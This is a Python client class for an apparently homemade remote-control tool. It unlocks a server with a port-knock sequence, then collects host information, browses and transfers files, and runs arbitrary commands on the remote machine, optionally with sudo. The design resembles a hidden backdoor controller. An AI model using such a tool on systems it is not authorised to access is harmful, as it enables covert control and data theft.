
import time
import socket
from send_knocks import send_knock
from time import sleep
import json


class client(object):
    """client object is created when a connection starts

    port 1 and port 2 are both send via the instructions port from the C server
    """

    host_info = None
    root_directory = {}
    next_directory = {}
    path = ""

    def __init__(self, ipaddr):
        self.ipaddr = ipaddr
        self.port_1 = None
        self.port_2 = None

    @classmethod
    def connect_to_server(self, ip_address):
        ip = ip_address
        # Required for access to server.
        send_knock(ip, 19)
        send_knock(ip, 13)
        send_knock(ip, 17)
        # sleep is required to allow the server to be ready
        sleep(1)

        instructs_connection = self.setup_socket(5020, ip)
        while True:
            instructions = instructs_connection.recv(1024).decode("utf-8")
            if instructions:
                break

        instructs_connection.close()
        sleep(1)
        # seperate the instructions on the space
        ports = instructions.split(' ')
        connection1 = self.setup_socket(int(ports[0]), ip)
        return connection1

    @classmethod
    def recv_timeout(self, the_socket, timeout=1):
        """
        continue recieving data until the server stops sending it
        obviously this will need be to linked to us changing our methods
        """
        the_socket.setblocking(0)
        total_data = ""
        data = ''
        # beginning time
        begin = time.time()
        while 1:
            # if you got some data, then break after timeout
            if total_data and time.time()-begin > timeout:
                break
            elif time.time()-begin > timeout*2:
                break
            try:
                data = the_socket.recv(1024)
                if data:
                    total_data += data.decode("utf-8")
                    # change the beginning time for measurement
                    begin = time.time()
                else:
                    time.sleep(0.1)
            except Exception as e:
                pass
        return total_data

    @classmethod
    def get_host_data(self, connection: socket.socket):
        """get_host_data

        get host data is given the socket to communicate with,
        we will send the required commands to the server and
        then recieve the data back We must then parse the
        data and return it to the user we will recieve:
            - hostname
            - current uptime
            - output of uname -a
        return a dictionary with the data
        """
        host_data = {}
        hostname = self.send_msg(connection, 'hostname')
        uptime = self.send_msg(connection, 'uptime')
        uname = self.send_msg(connection, 'uname')
        who = self.send_msg(connection, 'who')
        host_data['hostname'] = hostname
        host_data['uptime'] = uptime
        host_data['uname'] = uname
        host_data['active_users'] = who
        self.host_info = host_data
        return self.host_info

    @classmethod
    def get_dir(self, connection: socket.socket):
        """get_dir sends the root directory to the client

        get dir sends the string 'tree' which the server interprets as our
        first "main" run. the server will change directories to root
        and run tree -J -L 1. This command renders a Json file of the
        root directory and sends it back to the client

        """
        self.path = ""
        json_str = self.send_msg(connection, 'tree')
        json_str = json_str.rstrip()
        json_obj = json.loads(json_str)
        list_obj = self.load_json_list(json_obj[0])
        self.root_directory = list_obj
        return self.root_directory

    @classmethod
    def new_path(self, connection: socket.socket, user_selection: str):
        """new_path

        takes the path selected from the UI and sends it to the server
        the server returns a json object that we will parse and
        display on the UI
        """
        self.path = self.track_path(user_selection)
        # make our command string to send to the server
        # /home/Desktop *example*
        msg = f'nextdir {self.path}'
        json_str = self.send_msg(connection, msg)
        json_str = json_str.rstrip()
        json_obj = json.loads(json_str)
        self.next_directory = self.load_json_list(json_obj[0])
        return self.next_directory

    @classmethod
    def track_path(self, path: str):
        """track_path

        This function allows the user to visually
        see the path they're taking as
        they manouver through the directories.

        This visual aid is helpful when deciding where
        to upload a file to
        """
        self.path = (self.path + "/" + path)
        return self.path

    @classmethod
    def send_msg(self, connection: socket, msg: str):
        """
        send_msg

        sends the command 'msg' to the server and
        returns the data recieved
        """
        connection.send(msg.encode("utf-8"))
        data = self.recv_timeout(connection)
        return data

    @classmethod
    def setup_socket(self, port: int, ip: str):
        """
        given a port and ip address create a socket
        and return it
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        address = (ip, port)
        sock.connect(address)
        return sock

    @classmethod
    def load_json_list(self, content):
        """
        The server uses the linux tree command to
        generate a json objects of the directory.
        This has to be parsed correctly and returned
        as a list of tuples in order for the html
        to be rendered correctly on the flask page
        """
        type_file = []
        name = []
        for key, value in content.items():
            if (type(value) == list):
                for content in value:
                    for (key, value) in content.items():
                        if key == 'type':
                            type_file.append(value)
                        if key == 'name':
                            name.append(value)
        all_content = list(zip(type_file, name))
        return all_content

    @classmethod
    def download_file(self, connection: socket.socket, path_to_file: str):
        """
        """
        path_to_file = f'download {path_to_file}'
        file_data = self.recieve_file(connection, path_to_file)
        return file_data

    @staticmethod
    def recieve_file(connection: socket.socket, path_to_file: str,
                     timeout=1) -> bytes:
        """
        The path to the file is sent to our server which then
        returns that as a byte string This function is different
        then recv_timeout because we are not decoding any data
        """
        connection.send(path_to_file.encode("utf-8"))
        connection.setblocking(0)
        total_data = b''
        data = b''

        begin = time.time()
        while 1:
            if total_data and time.time()-begin > timeout:
                break
            elif time.time()-begin > timeout*2:
                break
            try:
                data = connection.recv(1024)
                if data:
                    total_data += data
                    begin = time.time()
                else:
                    time.sleep(0.1)
            except Exception as e:
                pass
        return total_data

    @classmethod
    def build_script(self, command: str, arguments: str,
                     uid: str, sudo: str):
        """build_script recieves the input from flask and generates a command
        string that will be sent to the server
        """

        if uid != "" and uid.isdigit():
            uid = "-u \#" + uid  # nopep8
        list_script = []
        if sudo == "1":
            for word in ("sudo", uid, command, arguments):
                if word is not None:
                    list_script.append(word)
        else:
            for word in (uid, command, arguments):
                if word is not None:
                    list_script.append(word)
        script = " ".join(list_script)
        return script

    @classmethod
    def run_script(self, connection: socket.socket, script: str):
        """run_script sends the command string to our server.
        send_msg will recieve the return value from the server
        and save it in a file named 'script_runner.txt'
        It is stored in the file so that we can read
        line by line and display it using html
        """
        msg = f'runscript {script}'
        data = self.send_msg(connection, msg)
        with open('script_runner.txt', 'w') as f:
            f.write(data)
        return

    @classmethod
    def upload_file(self, connection: socket.socket, local_file: str,
                    upload_file: str):
        """
        *This function is not fully implemented
        Upload_file is designed to recieve a file
        path from the local machine that cm.py will be
        running on. It is then supposed to send the
        data in chunks to our server as binary data

        Upload file is able to send .txt files but
        will not work with .jpg files.
        pdf files are able to be send but
        an exact copy is not guarunteed
        """

        msg = f'upload {upload_file}'
        self.send_msg(connection, msg)
        sleep(1)

        file = open(local_file, 'rb')
        while True:
            data = file.readline()
            connection.send(data)
            if not data:
                break

        file.close()
        sleep(1)
        done_msg = f'done'
        self.send_msg(connection, done_msg)
        return
